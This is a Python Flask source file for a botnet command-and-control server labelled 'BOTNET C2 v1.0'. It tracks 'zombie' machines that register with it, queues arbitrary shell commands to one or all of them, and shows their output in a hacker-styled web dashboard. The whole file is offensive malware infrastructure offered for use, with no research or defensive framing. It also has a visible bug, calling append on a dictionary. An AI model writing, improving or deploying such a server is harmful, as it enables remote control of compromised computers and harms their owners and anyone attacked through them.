# c2_server.py
from flask import Flask, render_template_string, request, jsonify
import json
import time
import threading
import os

app = Flask(__name__)

# In-memory zombie database
zombies = {}
command_queue = {}
command_results = {}

HTML_UI = '''
<!DOCTYPE html>
<html>
<head>
    <title>☠️ BOTNET C2 v1.0</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Consolas', monospace; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
        .stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: #111; border: 1px solid #1a1a1a; padding: 15px; border-radius: 4px; }
        .stat-card .label { color: #4a4a4a; font-size: 11px; text-transform: uppercase; }
        .stat-card .value { color: #00ff00; font-size: 22px; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; background: #111; }
        th { background: #1a1a1a; color: #4a4a4a; padding: 10px; text-align: left; }
        td { padding: 8px 10px; border-bottom: 1px solid #1a1a1a; }
        .online { color: #00ff00; }
        .offline { color: #ff3333; }
        .cmd-input { display: flex; gap: 10px; margin: 20px 0; }
        .cmd-input input { flex: 1; background: #111; border: 1px solid #1a1a1a; color: #00ff00; padding: 10px; font-family: 'Consolas', monospace; }
        .cmd-input button { background: #111; border: 1px solid #00ff00; color: #00ff00; padding: 10px 20px; cursor: pointer; }
        .cmd-input button:hover { background: #00ff00; color: #0a0a0a; }
        .results { background: #111; border: 1px solid #1a1a1a; padding: 15px; margin-top: 20px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; }
        .refresh { float: right; background: #111; border: 1px solid #1a1a1a; color: #4a4a4a; padding: 5px 15px; cursor: pointer; }
        .refresh:hover { border-color: #00ff00; color: #00ff00; }
    </style>
    <script>
        function refreshStats() { fetch('/api/stats').then(r=>r.json()).then(d=>{ document.getElementById('total').innerText=d.total; document.getElementById('online').innerText=d.online; }); }
        function refreshTable() { fetch('/api/zombies').then(r=>r.json()).then(d=>{ let html=''; d.forEach(z=>{ html+=`<tr><td>${z.id}</td><td class="${z.status}">${z.status}</td><td>${z.os}</td><td>${z.ram}</td><td>${z.disk}</td><td>${z.last_seen}</td></tr>`; }); document.getElementById('zombie-table').innerHTML=html; }); }
        function sendCommand() { let cmd=document.getElementById('cmd').value; let target=document.getElementById('target').value; fetch('/api/command', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:target,command:cmd})}).then(()=>{ document.getElementById('cmd').value=''; refreshResults(); }); }
        function refreshResults() { fetch('/api/results').then(r=>r.json()).then(d=>{ let html=''; d.forEach(r=>{ html+=`[${r.target}] ${r.command}\\n${r.output}\\n---\\n`; }); document.getElementById('results').innerText=html; }); }
        setInterval(()=>{ refreshStats(); refreshTable(); refreshResults(); }, 5000);
        window.onload = function(){ refreshStats(); refreshTable(); refreshResults(); };
    </script>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>☠️ BOTNET C2 v1.0</h1>
        <button class="refresh" onclick="refreshStats();refreshTable();refreshResults();">⟳ REFRESH</button>
    </div>
    <div class="stats">
        <div class="stat-card"><div class="label">Total Zombies</div><div class="value" id="total">0</div></div>
        <div class="stat-card"><div class="label">Online</div><div class="value" id="online">0</div></div>
        <div class="stat-card"><div class="label">Offline</div><div class="value" id="offline">0</div></div>
        <div class="stat-card"><div class="label">Commands Queued</div><div class="value" id="queued">0</div></div>
    </div>
    <div class="cmd-input">
        <input type="text" id="target" placeholder="Target ID (or * for all)" value="*">
        <input type="text" id="cmd" placeholder="Enter command...">
        <button onclick="sendCommand()">EXECUTE</button>
    </div>
    <table>
        <thead><tr><th>ID</th><th>Status</th><th>OS</th><th>RAM</th><th>Disk</th><th>Last Seen</th></tr></thead>
        <tbody id="zombie-table"></tbody>
    </table>
    <div class="results" id="results">Waiting for output...</div>
</div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_UI)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    zombie_id = data.get('id')
    if not zombie_id:
        return jsonify({'error': 'missing id'}), 400
    zombies[zombie_id] = {
        'id': zombie_id,
        'status': 'online',
        'os': data.get('os', 'unknown'),
        'ram': data.get('ram', '0'),
        'disk': data.get('disk', '0'),
        'last_seen': time.strftime('%Y-%m-%d %H:%M:%S'),
        'ip': request.remote_addr
    }
    # Assign any pending commands
    if zombie_id in command_queue:
        cmd = command_queue.pop(zombie_id)
        return jsonify({'command': cmd})
    return jsonify({'command': None})

@app.route('/api/result', methods=['POST'])
def result():
    data = request.json
    zombie_id = data.get('id')
    output = data.get('output', '')
    cmd = data.get('command', '')
    if zombie_id:
        command_results.append({
            'target': zombie_id,
            'command': cmd,
            'output': output,
            'time': time.strftime('%Y-%m-%d %H:%M:%S')
        })
    return jsonify({'status': 'ok'})

@app.route('/api/stats')
def stats():
    total = len(zombies)
    online = sum(1 for z in zombies.values() if z['status'] == 'online')
    return jsonify({'total': total, 'online': online})

@app.route('/api/zombies')
def list_zombies():
    return jsonify(list(zombies.values()))

@app.route('/api/command', methods=['POST'])
def command():
    data = request.json
    target = data.get('target', '*')
    cmd = data.get('command', '')
    if target == '*':
        for zid in zombies:
            command_queue[zid] = cmd
    else:
        command_queue[target] = cmd
    return jsonify({'status': 'queued'})

@app.route('/api/results')
def results():
    return jsonify(command_results)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
